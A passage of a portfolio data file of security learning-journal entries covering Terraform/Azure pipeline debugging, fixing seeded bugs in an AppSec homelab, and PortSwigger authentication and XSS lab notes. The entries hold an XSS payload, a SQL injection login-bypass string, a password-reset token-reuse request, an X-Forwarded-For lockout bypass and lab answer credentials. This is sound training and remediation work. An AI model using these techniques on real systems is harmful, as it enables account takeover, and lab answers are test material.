      "Also lost a fix by editing the pipeline YAML in ADO's web editor while the same file was open locally: that editor commits straight to main and overwrote the uncommitted local edit",
    ],
    body: [
      'Added terraform fmt -check -diff, scoped to workingDirectory: terraform. It failed: Not found workingDirectory: /home/vsts/work/1/s/terraform. Checked remotes, branches, and service connections first, assuming a GitHub or ADO connection problem. All fine.',
      "The Install Terraform script's rm -rf terraform terraform.zip ran at the checkout root - the same directory my repo's own terraform/ source folder lives in. The downloaded Terraform binary was named terraform, colliding with the source directory of the same name. That rm -rf deleted my source folder before the next step ran.",
      'Fixed by installing Terraform inside its own tf-install/ subdirectory instead of the repo root, so the install and cleanup logic can no longer touch checked-out source files.',
      "Also lost a fix by editing the pipeline YAML in ADO's built-in editor while the same file was open locally. ADO's editor commits straight to main and overwrote the uncommitted local edit; had to redo the fix.",
      'A downloaded artifact and a real source folder sharing a directory name is a classic self-inflicted CI bug. Anything you download and clean up belongs in its own subdirectory, never the checkout root.',
    ],
    screenshots: ['SecureAzureLandingZone/SALZ3.webp'],
    tools: ['Azure DevOps', 'Terraform', 'YAML'],
    tags: [
      'Secure Azure Landing Zone',
      'Azure DevOps',
      'CI/CD pipeline',
      'Terraform',
      'infrastructure as code',
    ],
  },
  {
    id: 'secure-azure-landing-zone-entry-1-validate-stage',
    date: '2026-09-17',
    category: 'Secure Azure Landing Zone',
    milestone: true,
    title: 'Azure DevOps pipeline: Validate stage, installing Terraform',
    workedOn: [
      'Started a new project, secure-azure-landing-zone, with the CI pipeline before writing much Terraform: a Validate stage first, to catch mistakes before they touch real infrastructure',
      'Set up an Azure DevOps org from scratch, separate from the Azure Portal account the resources live in',
      'Installed Terraform on the pipeline agent with a plain curl + unzip script rather than the marketplace TerraformInstaller task',
      'Diagnosed a pipeline that hung on the Install Terraform step: unzip was waiting on an interactive overwrite prompt, and a hosted agent has no stdin to answer it',
      'Fixed that with unzip -o, then hit a second failure: cannot delete old terraform: Is a directory. A stray terraform directory from the failed run was left in the workspace, and unzip can overwrite a file but not a directory',
      'Fixed it by wiping the workspace (rm -rf terraform terraform.zip) at the top of the script, before anything else runs',
      'Caught a YAML formatting mistake: a pasted curl command with a stray line break split into two broken shell commands, since line breaks in a script: | block are command boundaries unless escaped with \\',
      'terraform -version now prints Terraform v1.9.8 cleanly on every run, regardless of the state the agent workspace was left in',
      'Next: terraform fmt -check and terraform init -backend=false',
    ],
    body: [
      'New project: secure-azure-landing-zone, starting with the CI pipeline before writing much Terraform. Setting up the Azure DevOps org was a reminder that Azure Portal (where cloud resources live) and Azure DevOps (where pipelines and repos live) are separate products from the same vendor, connected later through a Service Connection.',
      'For installing Terraform on the agent, chose the plain-script approach - curl the release, unzip it - over the marketplace TerraformInstaller task, so it is visible what actually happens on the agent.',
      'That surfaced three bugs. First, the pipeline hung: unzip was waiting on an interactive overwrite prompt left over from a re-run, and a hosted agent has no stdin to answer it. Fixed with unzip -o.',
      'Second, the next run failed differently: cannot delete old terraform: Is a directory. A previous failed run had left a stray terraform directory in the workspace, and unzip -o can overwrite a file, not a directory. Fixed by adding rm -rf terraform terraform.zip to the top of the script, so a hosted agent reused across retries always starts from a clean slate rather than an assumed one.',
      'Third, a smaller one: the curl command, pasted into the YAML script: | block, picked up a stray line break and split into two broken shell commands. Inside a script: | block, every line break is a command boundary unless continued with a trailing \\.',
      'With all three fixed, terraform -version prints Terraform v1.9.8 on every run, regardless of the state a previous run left the workspace in. Next: terraform fmt -check and terraform init -backend=false.',
    ],
    screenshots: [
      'SecureAzureLandingZone/SALZ1.webp',
      'SecureAzureLandingZone/SALZ2.webp',
    ],
    tools: ['Azure DevOps', 'Terraform', 'YAML'],
    tags: [
      'Secure Azure Landing Zone',
      'Azure DevOps',
      'CI/CD pipeline',
      'Terraform',
      'infrastructure as code',
    ],
  },
  {
    id: 'appsec-homelab-entry-19-terraform-azure-deploy',
    date: '2026-09-17',
    category: 'AppSec Homelab',
    milestone: true,
    title: 'Terraform + Azure: my first real IaC deployment',
    workedOn: [
      'Ran the first Terraform deployment against Azure: terraform plan then terraform apply, standing up a resource group and a storage account in australiaeast',
      'Authenticated through the Azure CLI rather than hardcoding credentials into the Terraform config',
      "Diagnosed a second toolchain issue after yesterday's Homebrew/Rosetta fix: a text editor auto-wrapping .tf files mid-line, breaking Terraform's HCL parser",
      'Confirmed the deployment in the Azure portal and the activity log: the storage account and resource group both created and visible',
      'Next: document the before/after in the repo, then terraform destroy - this was a scoped exercise, not infrastructure I need running long-term',
    ],
    body: [
      'Until now, everything in my AppSec homelab was stood up manually: clone the repo, docker compose up -d --build, done. It works, but the setup only exists in my shell history. Nothing shows what is about to change before it happens, and there is no clean way to tear it down.',
      'This phase called for a real example of Infrastructure as Code alongside the vulnerability work: DevSecOps means finding and fixing bugs, and it also means provisioning infrastructure properly.',
      'Set up Terraform against a free-tier Azure subscription, authenticating through the Azure CLI instead of hardcoding credentials into the config. The build was two resources: a resource group and a storage account inside it, defined in .tf files.',
      'Yesterday\'s Apple-Silicon-vs-Intel-Homebrew issue was sorted, but a second bug turned up: a text editor auto-wrapping the .tf files mid-line, which broke Terraform\'s HCL parser (resource "azurerm_storage_account" and "main" { split across two lines). Infrastructure-as-code is still code, syntax errors included.',
      'With the config clean, terraform plan showed what it was about to create - the resource group, then the storage account with every default and computed attribute - before anything was committed. terraform apply stood both resources up in australiaeast in under two minutes.',
      'The plan/apply split is the difference from Docker Compose, where a command just runs and you see what happens. Here, I got a diff of intended changes before Azure was touched, and a lockfile pinning the provider version so the build is reproducible on another machine.',
      'Confirmed it in the Azure portal and the activity log: stappsechomelab5791 under rg-appsec-homelab in Australia East, with the activity log listing every create and update operation Terraform ran to get there.',
      'Next: document this before/after in the repo, then run terraform destroy. This was a scoped exercise for the portfolio, not infrastructure I need running long-term, so it comes down once it is captured.',
    ],
    screenshots: [
      'Homelab/HomeLabTerraform1.webp',
      'Homelab/HomeLabTerraform2.webp',
    ],
    tools: ['Terraform', 'Azure CLI', 'Azure'],
    tags: [
      'AppSec homelab',
      'Terraform',
      'Azure',
      'DevOps',
      'infrastructure as code',
    ],
    links: [
      {
        label: 'appsec-homelab repo',
        url: 'https://github.com/charles-goodsir/appsec-homelab',
      },
    ],
  },
  {
    id: 'appsec-homelab-entry-18-azure-terraform-setup',
    date: '2026-09-16',
    category: 'AppSec Homelab',
    title: 'Setting up Terraform and Azure CLI for the first IaC piece',
    workedOn: [
      'Started Phase 3 of the homelab roadmap: a small Terraform-managed Azure resource, to close the most commonly-flagged skill gap in DevOps job postings',
      "Disabled the GitHub Actions workflow via the repo UI while this phase is in progress, so CI isn't running against a repo that isn't changing",
      "Hit a real environment problem installing Azure CLI: discovered Homebrew was running as an Intel (x86_64) install under Rosetta on what is actually an Apple Silicon Mac, which broke from-source builds of azure-cli's dependencies",
      'Installed native arm64 Homebrew alongside the old one, moved Terraform and Azure CLI onto it, confirmed both with file (real arm64 binaries) rather than trusting a stale build tag in terraform --version',
      'Signed up for an Azure free-tier subscription, authenticated the CLI with az login, confirmed the subscription is active and default',
      'Scaffolded the actual Terraform project: a providers.tf for the azurerm provider, ran terraform init, and fixed a real gitignore mistake before the first commit',
    ],
    body: [
      'Picked Azure over the mini-PC/Docker option for the Terraform piece, since actual DevOps postings mean cloud infrastructure when they say Terraform, not local containers. Storage account is the target: small, free-tier friendly, and simple enough to understand every line rather than copy a template.',
      "Before any of the Terraform work, disabled the GitHub Actions workflow from the repo's Actions tab. No reason to keep the nightly cron and push-triggered scans running against a repo that's about to sit still for a phase that has nothing to do with the app itself.",
      'Installing Azure CLI turned into its own debugging exercise. brew install azure-cli failed compiling one of its dependencies with "C compiler cannot create executables" - looked like a broken toolchain at first, but manual clang test-compiles showed the compiler itself was fine. The real issue: Homebrew was installed at the old Intel-only location (/usr/local) and running via Rosetta on what is actually an Apple Silicon Mac, so its build scripts kept targeting x86_64 with no real x86_64 toolchain behind them. Rosetta itself turned out to be broken too - "Bad CPU type in executable" on Homebrew\'s own bundled Ruby, likely from a Command Line Tools reinstall - and fixing that with softwareupdate --install-rosetta got brew running again but left the original compile failure untouched, confirming the architecture mismatch was the real root cause, not a broken toolchain.',
      "Fixed it properly rather than patching around it: installed native arm64 Homebrew at /opt/homebrew, pointed the shell at it via .zprofile, and reinstalled azure-cli and terraform through that instead. Confirmed with file on the actual binaries that they're real arm64 executables, since terraform --version stubbornly still prints darwin_amd64 - that turned out to be a static build tag from HashiCorp's release process, not a reflection of what's actually running.",
      'Signed up for an Azure free-tier account, authenticated via az login, and confirmed a subscription active and set as default. Then scaffolded the Terraform project itself: providers.tf declaring the azurerm provider, terraform init to pull the provider plugin down. First .gitignore draft ignored .terraform.lock.hcl, which is backwards - that lock file pins the exact provider version for reproducibility and should be committed, only the .terraform/ cache and state files should be ignored. Fixed before the first commit rather than after.',
      "Good reminder from this session: half the actual work in DevOps tooling is the environment underneath the tool, not the tool itself. The Terraform config is three lines so far. Getting to the point where it could even run took working through an architecture mismatch most tutorials never mention, because most people aren't running an Intel Homebrew install on Apple Silicon by accident.",
    ],
    tools: ['Terraform', 'Azure CLI', 'Homebrew'],
    tags: [
      'AppSec homelab',
      'Terraform',
      'Azure',
      'DevOps',
      'infrastructure as code',
      'toolchain debugging',
    ],
    links: [
      {
        label: 'appsec-homelab repo',
        url: 'https://github.com/charles-goodsir/appsec-homelab',
      },
    ],
  },
  {
    id: 'appsec-homelab-entry-17-risk-assessment',
    date: '2026-09-16',
    category: 'AppSec Homelab',
    title:
      'A lightweight risk assessment of the homelab, mapped to NIST CSF 2.0',
    workedOn: [
      "Wrote a lightweight risk assessment of the whole homelab environment (mini PC, vulnerable app, CI/CD pipeline, GitHub repo), structured around NIST CSF 2.0's five functions",
      'Listed the actual assets and threats, rated each by likelihood and impact, and mapped the controls already built - SSH hardening, ufw, fail2ban, SAST/secrets/DAST, SHA-pinned Actions - against Identify/Protect/Detect/Respond/Recover',
      'Flagged the real gaps rather than skipping them: no patch cadence on the mini PC, no Recover function in practice, no network segmentation',
    ],
    body: [
      "Stepped back from the hands-on exploit-and-fix work today to write a lightweight risk assessment of the whole homelab: the mini PC, the vulnerable app, the CI/CD pipeline, and the GitHub repo housing it. Structured it around NIST CSF 2.0's five functions - Identify, Protect, Detect, Respond, Recover - since that's the framework most of the AppSec and GRC job specs I'm reading name directly.",
      'The point was not to invent controls to document. Everything under Protect and Detect is stuff already built over the last few weeks - SSH key auth, ufw, fail2ban, Semgrep/gitleaks/ZAP in the pipeline, SHA-pinned Actions - mapped after the fact onto a standard structure instead of left as a loose pile of homelab tasks.',
      'Recover came back mostly empty, and I left it that way rather than padding it out. There is no backup or disaster-recovery process for the mini PC, which is a real gap on paper and a non-issue in practice since there is no production data to lose. Writing that down as a gap felt like the more honest version of the exercise than skipping the section.',
      'This is the part of the job I have not had much reason to practice day to day: taking real technical controls and describing them the way a risk register would, rather than the way an engineer would. Worth doing on purpose rather than meeting it for the first time in an actual GRC role.',
    ],
    tags: ['AppSec homelab', 'risk assessment', 'NIST CSF', 'GRC'],
    links: [
      {
        label: 'appsec-homelab repo',
        url: 'https://github.com/charles-goodsir/appsec-homelab/blob/main/homelab-risk-assessment.md',
      },
    ],
  },
  {
    id: 'appsec-homelab-entry-16-plaintext-password-fix',
    date: '2026-09-16',
    category: 'AppSec Homelab',
    milestone: true,
    title: 'Fixing plaintext password storage - the last seeded vulnerability',
    workedOn: [
      'Fixed the last of the four seeded vulnerabilities: plaintext password storage in the User model and SeedData',
      "Renamed the Password column to PasswordHash and switched to Microsoft.AspNetCore.Identity's PasswordHasher<User> for salted PBKDF2 hashing",
      'Rewrote AuthController.cs login to look up by username only, then verify the submitted password against the stored hash in C# instead of comparing plaintext in SQL',
      'Worked through three real compile/runtime errors along the way rather than getting a working version handed to me: statements nested inside an AddRange() call, a missing fallthrough return, and a stale SQLite database that still had the old schema',
      "Re-tested: correct login still works, a wrong password now correctly fails, and the SQLi payload from the login bypass fix still fails - confirming the parameterized query wasn't affected by the password-check rewrite",
    ],
    body: [
      'Last of the four seeded bugs. This one is different in kind from the other three - not an injection flaw with a clever payload, but a cryptographic failure: the User model stored Password as a raw string, and the login query checked it with Password = @Password. A leaked database would have handed over every credential in plain text, and since people reuse passwords, that kind of leak cascades well beyond this one app.',
      "Worked through this one myself rather than having the fix handed to me, which meant hitting the errors instead of skipping past them. First one: renamed the model property to PasswordHash and started building the seed data, but put the hasher setup and hash assignments as loose statements at the top of the file, outside any method - that doesn't compile in a file that also declares a class. Moved it inside SeedData.Initialize(), inside the existing if (!db.Users.Any()) gate, right where the old plaintext User objects were built.",
      'Second error: those same setup lines ended up nested inside the parentheses of db.Users.AddRange(...), as if they were arguments to the call. AddRange takes finished objects, not statements. Pulled the hasher/admin/wiener setup out as their own lines before the call, then AddRange(admin, wiener) just took the two ready objects.',
      'Third one was in AuthController.cs. The old query checked username and password together in one WHERE clause, which cannot work once the password column holds a salted hash - the same password hashes differently every time, so there is no way to compare it with SQL\'s =. Rewrote the query to look up by username only, pulled the stored hash out of the reader, and used PasswordHasher<User>.VerifyHashedPassword to check the submitted password against it in C#. First pass at this still left a dangling @Password parameter bound to a query that no longer referenced it, a missing semicolon and an unbalanced Ok(...) call, and the one that stopped it compiling: no return statement for the case where reader.Read() finds no matching username at all. IActionResult has to return something on every path through the method; added a single return Unauthorized(...) after the if block, covering both "user does not exist" and "user exists but password is wrong" with one line instead of two, which also avoids leaking which case it was.',
      'Once it compiled, the real gotcha was runtime, not code: SQLite Error 1: no such column: PasswordHash. This app creates its schema with EnsureCreated(), not EF migrations, and EnsureCreated only builds the database if the file does not already exist - it will never alter an existing database to match a changed model. The old appseclab.db was still sitting there with the original Password column, so the app kept using it. Deleting it once was not enough either, because SQLite in WAL mode keeps -shm and -wal side files alongside the main database file, and those can carry stale state back in on reconnect. Stopped the backend, deleted appseclab.db, appseclab.db-shm, and appseclab.db-wal together, and restarted - a completely fresh database built from the current model, PasswordHash column included.',
      "Re-tested the same way as the other three fixes: correct credentials (administrator / admin123) log in, a wrong password returns 401, and the SQL injection payload from the login-bypass fix (administrator'-- with any password) still returns invalid credentials - confirming the parameterized query underneath wasn't disturbed by rewriting the password-check logic on top of it. Checked the raw data too: SELECT Username, PasswordHash FROM Users now shows long hashed blobs instead of admin123 and peter in plain text.",
      'All four seeded vulnerabilities are fixed now, each with a before/exploit/fix/re-test story. This is the one I\'m most likely to bring up in an interview, not because the fix itself is exotic, but because of what broke along the way: a structural C# mistake, a missing-return compile error, and an EnsureCreated/WAL-file trap that had nothing to do with the security logic at all. Debugging "why does the fix not seem to be working" turned out to be as much the job as writing the fix in the first place.',
    ],
    codeSnippets: [
      {
        label: 'AuthController.cs - before (plaintext comparison in SQL)',
        code: 'var sql = "SELECT Id, Username FROM Users WHERE Username = @Name AND Password = @Password";\n// ...\nif (reader.Read())\n{\n    return Ok(new { username = reader["Username"].ToString(), message = "Login successful" });\n}\nreturn Unauthorized(new { message = "Invalid credentials" });',
      },
      {
        label:
          'AuthController.cs - after (lookup by username, verify hash in C#)',
        code: 'var sql = "SELECT Id, Username, PasswordHash FROM Users WHERE Username = @Name";\n// ... nameParam bound, no password parameter ...\nif (reader.Read())\n{\n    var storedHash = reader["PasswordHash"].ToString();\n    var hasher = new PasswordHasher<User>();\n    var result = hasher.VerifyHashedPassword(new User(), storedHash, request.Password);\n    if (result == PasswordVerificationResult.Success)\n    {\n        return Ok(new { username = reader["Username"].ToString(), message = "Login successful" });\n    }\n}\nreturn Unauthorized(new { message = "Invalid credentials" });',
      },
      {
        label: 'SeedData.cs - hashing at seed time',
        code: 'var hasher = new PasswordHasher<User>();\nvar admin = new User { Username = "administrator" };\nadmin.PasswordHash = hasher.HashPassword(admin, "admin123");\nvar wiener = new User { Username = "wiener" };\nwiener.PasswordHash = hasher.HashPassword(wiener, "peter");\ndb.Users.AddRange(admin, wiener);',
      },
    ],
    screenshots: [
      'Homelab/HomeLabPasswordFix1.webp',
      'Homelab/HomeLabPasswordFix2.webp',
      'Homelab/HomeLabPasswordFix3.webp',
      'Homelab/HomeLabPasswordFix4.webp',
    ],
    tools: ['.NET / C#', 'ASP.NET Core Identity', 'SQLite', 'curl'],
    tags: [
      'AppSec homelab',
      'cryptographic failures',
      'password hashing',
      'PBKDF2',
      'OWASP Top 10',
    ],
    links: [
      {
        label: 'appsec-homelab repo',
        url: 'https://github.com/charles-goodsir/appsec-homelab',
      },
    ],
  },
  {
    id: 'appsec-homelab-entry-15-readme-audit-xss-reverify',
    date: '2026-09-16',
    category: 'AppSec Homelab',
    title: 'Auditing the README against the code, and re-proving the XSS fix',
    workedOn: [
      "Checked the homelab README's vulnerability claims against the actual code and found it had gone stale: both seeded SQLi bugs were already fixed (in earlier sessions) but still listed as live exploits, and the reflected XSS claim didn't hold up either - the code was already safe JSX text interpolation, not the raw-HTML render the README described",
      'Reintroduced a genuine XSS (dangerouslySetInnerHTML) to get a clean, current repro instead of relying on an old screenshot',
      "Confirmed the exploit live: <img src=x onerror=alert('XSS')> rendered as a real <img> tag and fired the alert",
      'Reverted to JSX text interpolation and re-tested the identical payload - renders as inert text, no execution',
      "Rewrote the README's vulnerability table and exploit section to match what the code does now",
    ],
    body: [
      "Before starting on anything new, went back through the README with a critical eye, since a couple of the claims in it dated from mid-fixes I'd since finished and never looped back to document. Both AuthController.cs and ProductsController.cs SQLi were already parameterized (Entries 11 and 12), but the README's 'Demonstrated exploits' section still gave working payloads for both, as if they'd still open a way in. Worse than a bug: it's a claim a technical reader could disprove in thirty seconds.",
      "The XSS entry was similar but slightly different - the code was already back to safe {submittedQuery} interpolation, which is correct, but the README had also picked up a fabricated detail along the way: a note claiming the nginx CSP blocks the exploit payload. There was never a live bug for that CSP to be blocking - React escapes JSX text by default regardless of CSP. That line was documenting a fix for a problem that wasn't there.",
      "Rather than just correct the wording from memory, wanted current, provable evidence instead of relying on an old screenshot. Put dangerouslySetInnerHTML back into ProductSearch.tsx, ran the app, and fired <img src=x onerror=alert('XSS')> at the search box. It rendered as a real image element in the DOM (broken-icon and all) and the onerror handler executed - confirmed both visually and in the console.",
      "Reverted the component to plain JSX text interpolation and ran the identical payload again. This time it came back as literal text - You searched for: <img src=x onerror=alert('XSS')> - printed on the page, not parsed. Console showed no script execution on the reload. Same bug class as Entry 13, now re-verified against the current code instead of taken on faith.",
      "Rewrote the README's vulnerability table to carry a Status column (Fixed / Open) and replaced the exploit section with an honest before -> exploit -> fix -> re-test writeup for all three bugs, dropping the incorrect CSP claim entirely. Plaintext password storage in SeedData.cs is the one item still open.",
      'Small lesson worth keeping: a fixed vulnerability is only as credible as the docs describing it. Docs drift from code the moment you stop re-checking them against it - worth treating a README claim about security behaviour the same as a test assertion, something that can go stale and needs re-running, not just written once.',
    ],
    codeSnippets: [
      {
        label:
          'Product search result - before (dangerouslySetInnerHTML, reintroduced for this exercise)',
        code: '<p\n  dangerouslySetInnerHTML={{\n    __html: `You searched for: ${submittedQuery}`,\n  }}\n/>',
      },
      {
        label: 'Product search result - after (JSX text interpolation)',
        code: '<p>You searched for: {submittedQuery}</p>',
      },
    ],
    tools: ['React', 'JSX', 'Chrome DevTools'],
    tags: [
      'AppSec homelab',
      'XSS',
      'reflected XSS',
      'output encoding',
      'documentation',
    ],
    links: [
      {
        label: 'appsec-homelab repo',
        url: 'https://github.com/charles-goodsir/appsec-homelab',
      },
    ],
  },
  {
    id: 'appsec-homelab-entry-14-cicd-pipeline',
    date: '2026-09-11',
    category: 'AppSec Homelab',
    milestone: true,
    title:
      'Building a real CI/CD security pipeline (and chasing a moving IP address)',
    workedOn: [
      'Rebuilt the appsec-homelab GitHub Actions workflow from one Semgrep job into a staged, gated pipeline: secrets, sast, build, dependency-scan, and test running in parallel with needs: encoding the real dependency graph',
      'Hardened the workflow itself: SHA-pinned actions, least-privilege permissions per job, SARIF upload to the Security tab, a concurrency group to cancel stale runs',
      'Added a real deployment gate: build -> deploy-staging -> deploy-prod, with deploy-prod tied to a GitHub production Environment that requires a human reviewer to approve before anything ships',
      "Chased a connection-refused error through firewall rules, fail2ban, and iptables before finding the actual cause: the mini PC's Wi-Fi adapter has no fixed IP and DHCP had re-leased a different address",
      'Added dependency scanning (dotnet list package --vulnerable, npm audit) with Dependabot on both ecosystems and on the pinned GitHub Actions, Trivy container scanning left report-only pending a baseline, and DAST run over the same SSH connection as the deploy since the mini PC is LAN-only',
      "Added a nightly cron run, a summary job that reads every other job's result into one pass/fail table, and a Mermaid pipeline diagram in the README",
    ],
    body: [
      'Went into this session wanting one thing to stop being a soft spot in interviews: a true, specific answer to "have you worked with a deployment gate" instead of a textbook one. AppSec Homelab already had a vulnerable app and a single-job Semgrep scan. The goal was to turn that one script into something that actually behaves like a CI/CD security pipeline - staged, gated, and evidenced.',
      'Where it started: security.yml was one job - pull the Semgrep container, run semgrep ci, done. Fine for "I ran a scanner once", not enough for "I built a pipeline".',
      "Phase 1 was structure before scope. Split the single job into named, parallel ones: secrets (gitleaks), sast (Semgrep), build, dependency-scan, test. Independent jobs run concurrently now instead of accidentally serially, and needs: encodes the actual dependency graph - test can't run until build succeeds.",
      'Alongside that: SHA-pinned actions, since a mutable tag like actions/checkout@v4 could have its target moved if the maintainer\'s account were ever compromised, running malicious code with my secrets in scope on the next push - pinning to a commit SHA makes that impossible, paired with Dependabot\'s github-actions ecosystem (added in Phase 3) so the pins still get updated, just via a reviewed PR instead of silently. Least-privilege permissions: read-only at the workflow level by default, with only the sast job elevated to security-events: write because it needs to upload SARIF - the same principle as scoping an IAM role, so a compromised step\'s blast radius is "can read the repo", not "can push to main". SARIF upload to the Security tab so Semgrep findings show up as first-class, dismissible findings instead of buried log output. A concurrency group so a second push cancels a stale run in flight.',
      "Phase 2 was the part I actually wanted: build -> deploy-staging -> deploy-prod, with deploy-prod tied to a GitHub production Environment that has a required-reviewer protection rule. When the pipeline reaches that job it pauses - nothing ships to production until a human clicks approve in the UI. That pause is the deployment gate, the same mechanism Azure DevOps release pipelines are built around, just GitHub's version of it, and now I have a working one I can screenshot rather than describe in the abstract. deploy-staging SSHes into the mini PC and runs docker compose up -d --build, reusing the infrastructure already built for the DAST target rather than standing up a second environment from scratch.",
      "Getting the SSH key wired up ate the most time, and the reason was a good lesson on its own. The mini PC's Wi-Fi adapter doesn't have a fixed IP, and DHCP was re-leasing a different address between the moment I checked sshd status and the moment I tried to connect. Chased \"connection refused\" through firewall rules, fail2ban ban lists, and iptables tables that were all completely correct, because the real problem was one layer up - I was connecting to an address the machine wasn't on anymore. The fix was dumb in hindsight: ip addr show on the target, twice, a few minutes apart, showed two different IPs. Stopped trusting the IP written down in DEPLOY.md, re-checked it live, and the SSH connection worked first try with no firewall or fail2ban change needed.",
      "The proper fix is a DHCP reservation on the router so the mini PC always gets the same lease. I don't have router admin access right now, so that's parked as a known gap with a documented workaround (a static IP set with nmcli on the host itself) rather than something forced through. Worth keeping as a general debugging habit: when every layer you check comes back clean, check whether you're even checking the right target.",
      'Secrets went into the staging GitHub Environment specifically, not the repo-wide secrets store - environment-scoped secrets are only visible to jobs that declare environment: staging, so the production approval gate actually protects something. A repo-level secret would be visible to deploy-prod regardless of whether anyone approved it, which defeats the point of having the gate at all.',
      "Phase 3 added depth. Dependency scanning: dotnet list package --vulnerable --include-transitive for NuGet, npm audit --audit-level=high for the frontend, plus Dependabot enabled on both ecosystems and on the pinned GitHub Actions, so vulnerable dependencies surface as PRs instead of silent drift. Container scanning with Trivy builds both Docker images fresh and scans the filesystem inside each - OS packages and dependencies baked into the final layer, which source-level SAST and SCA structurally cannot see. Left it report-only (exit-code: 0) deliberately: I don't yet know this repo's baseline, and failing the build on an unreviewed first run would just block every deploy on noise. Triage first, tighten the gate second.",
      "DAST had an interesting constraint: the mini PC is LAN-only by design, never exposed to the internet, so a GitHub-hosted runner physically can't reach it. Rather than standing up a self-hosted runner, ran ZAP through the same SSH connection used for the deploy, so the scan executes on the LAN side where the target is actually reachable, then SCP the HTML report back and attach it to the workflow run as a downloadable artifact. Good enough for now - a self-hosted runner on the mini PC is the more correct long-term answer if DAST needs to become its own independent job.",
      "Phase 4 was making results visible without digging through logs. A nightly cron run, because dependency advisories update daily and a package clean yesterday can have a new CVE today with zero code changes on my end. A summary job with if: always() that reads every other job's result via needs.* and writes a pass/fail table to the run's $GITHUB_STEP_SUMMARY, so the pipeline's outcome is one glance instead of eight job logs. A Mermaid pipeline diagram in the README, which GitHub renders natively with no image asset needed, showing the parallel gates feeding staging, DAST folded into that stage, and the required-reviewer pause before production.",
    ],
    screenshots: ['Homelab/HomeLabCICD1.webp'],
    tools: [
      'GitHub Actions',
      'Semgrep',
      'gitleaks',
      'Trivy',
      'OWASP ZAP',
      'Dependabot',
      'Docker Compose',
      'SSH',
    ],
    tags: [
      'AppSec homelab',
      'CI/CD pipeline',
      'deployment gate',
      'SCA',
      'container scanning',
      'DAST',
      'least privilege',
      'SHA pinning',
    ],
    links: [
      {
        label: 'appsec-homelab repo',
        url: 'https://github.com/charles-goodsir/appsec-homelab',
      },
    ],
  },
  {
    id: 'portswigger-auth-labs-1-5',
    date: '2026-09-08',
    category: 'PortSwigger Labs',
    title:
      'Authentication labs 1-5 (username enumeration, 2FA bypass, password reset logic)',
    workedOn: [
      'Started the PortSwigger Authentication path, Labs 1 to 5',
      'Labs 1, 4, 5: username enumeration - by response text, by a subtly different error message, and by response timing',
      'Lab 2: 2FA bypass by navigating straight to the post-login page',
      'Lab 3: password reset with a token that does not change, reused against another account',
    ],
    body: [
      'New topic after finishing XSS. Authentication labs are less about payload craft and more about logic flaws and Burp Intruder workflow: enumerate usernames, then passwords, off small differences in the responses.',
      'Intruder came up in almost every lab here. Lab 1 I fumbled the setup - pasted the whole username=root string into the payload position instead of just the value, so the parameter never varied. Marked the insertion point properly and the wordlist ran fine after that.',
      'Lab 5 was the longest. Timing-based enumeration needs enough samples per request to see the signal over the noise, and then there is a second step: the account lockout. Got past it by adding an X-Forwarded-For header with a junk value so each attempt looked like it came from a new IP.',
    ],
    labs: [
      {
        title: 'Lab 1: Username enumeration via different responses',
        notes: [
          'Logged in with a bad username, intercepted the request in Burp, sent it to Intruder as a Sniper attack over the lab username list.',
          'First run did nothing useful - I had pasted username=root into the payload marker instead of just the value, so the parameter never changed. Fixed the insertion point to wrap only the username value.',
          'Looking for a response that is a different length or status from the rest. albuquerque came back longer, with an "Incorrect password" message instead of "Invalid username", so that is the valid username.',
          'Second Intruder run with albuquerque fixed and the password list as the payload. The right password returns a 302 instead of 200.',
        ],
        solution: 'Username: albuquerque\nPassword: mustang',
        status: 'completed',
        screenshots: ['Burp/Lab1Authentication.webp'],
      },
      {
        title: 'Lab 2: 2FA simple bypass',
        notes: [
          'Logged into my own account first and noted the flow: after the login step the app goes to the 2FA code page, then to /my-account.',
          'Logged in as the victim (carlos) with known credentials, got to the 2FA prompt, then changed the URL straight to /my-account.',
          'The app never checks that the 2FA step was actually completed, so it lets you in.',
        ],
        solution:
          'After reaching the 2FA prompt, navigate directly to /my-account.',
        status: 'completed',
        screenshots: ['Burp/Lab2Authentication.webp'],
      },
      {
        title: 'Lab 3: Password reset broken logic',
        notes: [
          'Requested a password reset for my own account and watched the flow in Burp. The reset token in the URL does not change between requests.',
          'Requested a reset for carlos, took the reset POST into Repeater, and swapped the username to carlos while keeping a valid token, with a password of my choice.',
          'The reset went through - the token is not tied to the account it was issued for, so a token from any reset request works for any username.',
        ],
        solution:
          'POST to the reset endpoint with temp-forgot-password-token=<any valid token>&username=carlos&new-password-1=test&new-password-2=test',
        status: 'completed',
        screenshots: ['Burp/Lab3Authentication.webp'],
      },
      {
        title: 'Lab 4: Username enumeration via subtly different responses',
        notes: [
          'Same idea as Lab 1 but the responses are almost identical. Used the Intruder grep-extract feature to pull the error message out of each response so small differences show in the results table.',
          'One response had a slightly longer warning message than the rest - the kind of thing that is easy to miss without the extract column. That username was valid.',
          'Ran the password list against it to finish.',
        ],
        solution: 'Username: Agenda\nPassword: Access',
        status: 'completed',
        screenshots: ['Burp/Lab4Authentication.webp'],
      },
      {
        title: 'Lab 5: Username enumeration via response timing',
        notes: [
          'The app checks the password even for invalid usernames, but a valid username with a very long password takes measurably longer to respond. Sent an over-long password and enumerated usernames by response time.',
          'This needs several requests per username to separate the signal from network jitter, so it was slow on the free version.',
          'After extracting the username and password there was still an account lockout to get past. Intercepted the login, set the stolen username and password, and added X-Forwarded-For: 888 so the request looked like it came from an unblocked IP. Forwarded it, turned off intercept, and the login went through.',
        ],
        solution:
          'Username: vagrant\nPassword: moon\n\nAccount lockout bypassed with an X-Forwarded-For header on the login request.',
        status: 'completed',
        screenshots: ['Burp/Lab5Authentication.webp'],
      },
    ],
    tools: ['Burp Suite', 'Burp Intruder', 'Burp Repeater', 'Web Browser'],
    tags: [
      'Authentication',
      'username enumeration',
      'Burp Intruder',
      '2FA bypass',
      'password reset',
      'response timing',
      'X-Forwarded-For',
    ],
    links: [
      {
        label: 'Authentication vulnerabilities',
        url: 'https://portswigger.net/web-security/authentication',
      },
    ],
  },
  {
    id: 'portswigger-xss-labs-25-30',
    date: '2026-09-07',
    category: 'PortSwigger Labs',
    milestone: true,
    title: 'Cross-Site Scripting (XSS) labs 25-30: XSS path complete',
    workedOn: [
      'Finished the XSS path with the expert-level labs, 25 to 30',
      'Labs 25-26: AngularJS sandbox escapes, one straight from the URL and one via the exploit server past a CSP',
      'Labs 27-28: an SVG animate href on a blocked-attribute lab, and a JavaScript URL with characters stripped',
      'Lab 29 (strict CSP + dangling markup): not completed - the target email updates but the lab never marks done, even with the official solution',
      "Lab 30 (CSP bypass): got a script past the CSP by injecting a script-src-elem 'unsafe-inline' directive through a second parameter",
    ],
    body: [
